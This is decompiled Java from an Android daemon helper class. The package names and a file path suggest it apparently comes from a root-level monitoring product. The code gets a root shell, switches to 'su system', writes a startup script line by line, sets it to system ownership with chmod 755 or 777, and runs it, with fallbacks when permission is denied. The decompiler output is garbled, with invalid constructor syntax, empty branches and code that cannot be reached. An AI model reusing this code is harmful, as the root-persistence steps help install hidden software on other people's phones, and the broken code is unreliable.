package com.fx.daemon;

import android.os.SystemClock;
import com.fx.daemon.exception.RunningException;
import com.vvt.io.d;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;

public abstract class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  private String a(String paramString, boolean paramBoolean)
  {
    int i = 1;
    String str1 = null;
    boolean bool1 = b;
    if (bool1) {}
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = paramString;
    String str2 = String.format("chmod 755 %s", arrayOfObject);
    KMShell.a(str2);
    bool1 = b;
    if (bool1) {}
    str2 = "";
    if (paramBoolean)
    {
      str2 = "%s; %s; %s";
      int j = 3;
      arrayOfObject = new Object[j];
      String str3 = "su system";
      arrayOfObject[0] = str3;
      arrayOfObject[i] = paramString;
      int k = 2;
      str1 = "exit";
      arrayOfObject[k] = str1;
      paramString = String.format(str2, arrayOfObject);
    }
    bool1 = a;
    if (bool1) {}
    str2 = KMShell.a(paramString);
    boolean bool2 = a;
    if (bool2) {}
    return str2;
  }
  
  private boolean b(String paramString1, String paramString2)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    boolean bool3 = a;
    if (bool3) {}
    Object localObject1 = f.b();
    Object localObject2 = new Object[bool1];
    localObject2[0] = paramString1;
    String str1 = String.format("/system/bin/ls %s", (Object[])localObject2);
    str1 = ((f)localObject1).a(str1);
    Object localObject3 = new Object[bool1];
    localObject3[0] = paramString1;
    localObject2 = String.format("cat %s", (Object[])localObject3);
    localObject2 = ((f)localObject1).a((String)localObject2);
    ((f)localObject1).d();
    localObject3 = "";
    localObject1 = paramString2.replaceAll("[^\\w]", (String)localObject3);
    boolean bool4 = a;
    if (bool4) {}
    localObject3 = "[^\\w]";
    String str2 = "";
    localObject2 = ((String)localObject2).replaceAll((String)localObject3, str2);
    bool4 = a;
    if (bool4) {}
    localObject3 = "No such file or directory";
    boolean bool5 = str1.contains((CharSequence)localObject3);
    if (!bool5)
    {
      bool3 = ((String)localObject2).contains((CharSequence)localObject1);
      if (!bool3) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      return bool1;
      bool1 = false;
    }
  }
  
  public abstract void a();
  
  protected void a(String paramString1, String paramString2)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = f.b();
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = new java/io/BufferedReader;
    Object localObject3 = new java/io/StringReader;
    ((StringReader)localObject3).<init>(paramString2);
    ((BufferedReader)localObject2).<init>((Reader)localObject3);
    for (;;)
    {
      localObject3 = ((BufferedReader)localObject2).readLine();
      if (localObject3 == null) {
        break;
      }
      String str = "echo \"%s\" >> %s";
      int j = 2;
      Object[] arrayOfObject = new Object[j];
      arrayOfObject[0] = localObject3;
      arrayOfObject[i] = paramString1;
      localObject3 = String.format(str, arrayOfObject);
      ((f)localObject1).a((String)localObject3);
    }
    d.a((BufferedReader)localObject2);
    SystemClock.sleep(500L);
    localObject3 = new Object[i];
    localObject3[0] = paramString1;
    localObject2 = String.format("chown system.system %s", (Object[])localObject3);
    ((f)localObject1).a((String)localObject2);
    long l = 1000L;
    SystemClock.sleep(l);
    localObject3 = new Object[i];
    localObject3[0] = paramString1;
    localObject2 = String.format("chmod 755 %s", (Object[])localObject3);
    ((f)localObject1).a((String)localObject2);
    bool2 = a;
    if (bool2) {}
    ((f)localObject1).d();
    bool1 = a;
    if (bool1) {}
    bool1 = b(paramString1, paramString2);
    bool2 = a;
    if ((!bool2) || (!bool1))
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = new java/io/IOException;
      ((IOException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void a(String[] paramArrayOfString)
  {
    int i = 0;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    String str1 = c();
    try
    {
      bool3 = a;
      if (bool3) {}
      localObject2 = f.b();
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      if (paramArrayOfString != null)
      {
        int j = paramArrayOfString.length;
        if (j > 0)
        {
          j = paramArrayOfString.length;
          while (i < j)
          {
            Object localObject4 = paramArrayOfString[i];
            Object localObject5 = " ";
            localObject5 = ((StringBuilder)localObject3).append((String)localObject5);
            Object localObject6 = new java/lang/StringBuilder;
            ((StringBuilder)localObject6).<init>();
            String str2 = "\"";
            localObject6 = ((StringBuilder)localObject6).append(str2);
            localObject4 = ((StringBuilder)localObject6).append((String)localObject4);
            localObject6 = "\"";
            localObject4 = ((StringBuilder)localObject4).append((String)localObject6);
            localObject4 = ((StringBuilder)localObject4).toString();
            ((StringBuilder)localObject5).append((String)localObject4);
            i += 1;
          }
        }
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject1 = ((StringBuilder)localObject1).append(str1);
      str1 = ((StringBuilder)localObject3).toString();
      localObject1 = ((StringBuilder)localObject1).append(str1);
      localObject1 = ((StringBuilder)localObject1).toString();
      bool2 = a;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      str1 = ((f)localObject2).a((String)localObject1);
      boolean bool4 = a;
      if (bool4) {}
      ((f)localObject2).d();
      if (str1 != null)
      {
        localObject2 = str1.toLowerCase();
        localObject3 = "not found";
        bool3 = ((String)localObject2).contains((CharSequence)localObject3);
        if (bool3)
        {
          localObject1 = new com/fx/daemon/exception/RunningException;
          str1 = "Startup script not found";
          ((RunningException)localObject1).<init>(str1);
          throw ((Throwable)localObject1);
        }
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      boolean bool3;
      Object localObject2;
      Object localObject3;
      RunningException localRunningException1 = new com/fx/daemon/exception/RunningException;
      localRunningException1.<init>("Cannot get root shell");
      throw localRunningException1;
      if (str1 != null)
      {
        localObject2 = str1.toLowerCase();
        localObject3 = "permission denied";
        bool3 = ((String)localObject2).contains((CharSequence)localObject3);
        if (bool3)
        {
          bool3 = false;
          localObject2 = null;
          a(localRunningException1, false);
        }
      }
      if (str1 != null)
      {
        str1 = str1.toLowerCase();
        localObject2 = "operation not permitted";
        bool2 = str1.contains((CharSequence)localObject2);
        if (bool2)
        {
          bool2 = false;
          str1 = null;
          a(localRunningException1, false);
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      return;
    }
    catch (Exception localException)
    {
      RunningException localRunningException2 = new com/fx/daemon/exception/RunningException;
      localRunningException2.<init>("Cannot get root shell");
      throw localRunningException2;
    }
  }
  
  public abstract String b();
  
  public abstract String c();
  
  public void d()
  {
    a(null);
  }
  
  public void e()
  {
    boolean bool1 = a;
    if (bool1) {}
    try
    {
      str = c();
      localObject1 = f.b();
      bool1 = a;
      if (bool1) {}
      Object localObject2 = "su system";
      ((f)localObject1).a((String)localObject2);
      localObject2 = "chmod 777 %s";
      int i = 1;
      localObject4 = new Object[i];
      localObject4[0] = str;
      localObject2 = String.format((String)localObject2, (Object[])localObject4);
      ((f)localObject1).a((String)localObject2);
      bool1 = a;
      if (bool1) {}
      localObject2 = ((f)localObject1).a(str);
      ((f)localObject1).d();
      localObject1 = "not found";
      bool2 = ((String)localObject2).contains((CharSequence)localObject1);
      if (bool2)
      {
        localObject2 = new com/fx/daemon/exception/RunningException;
        str = "Startup script not found";
        ((RunningException)localObject2).<init>(str);
        throw ((Throwable)localObject2);
      }
    }
    catch (CannotGetRootShellException localCannotGetRootShellException)
    {
      String str;
      Object localObject1;
      Object localObject4;
      boolean bool2;
      Object localObject3 = new com/fx/daemon/exception/RunningException;
      ((RunningException)localObject3).<init>("Cannot get root shell");
      throw ((Throwable)localObject3);
      if (localObject3 != null)
      {
        localObject1 = ((String)localObject3).toLowerCase();
        localObject4 = "permission denied";
        bool2 = ((String)localObject1).contains((CharSequence)localObject4);
        if (bool2)
        {
          bool1 = true;
          localObject3 = a(str, bool1);
        }
      }
      if (localObject3 != null)
      {
        localObject3 = ((String)localObject3).toLowerCase();
        localObject1 = "operation not permitted";
        bool1 = ((String)localObject3).contains((CharSequence)localObject1);
        if (bool1)
        {
          bool1 = true;
          a(str, bool1);
        }
      }
      bool1 = a;
      if (bool1) {}
      return;
    }
    catch (Exception localException)
    {
      RunningException localRunningException = new com/fx/daemon/exception/RunningException;
      localRunningException.<init>("Cannot get root shell");
      throw localRunningException;
    }
  }
  
  public void f()
  {
    boolean bool = a;
    if (bool) {}
    String str = b();
    ShellUtil.d(str);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/daemon/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */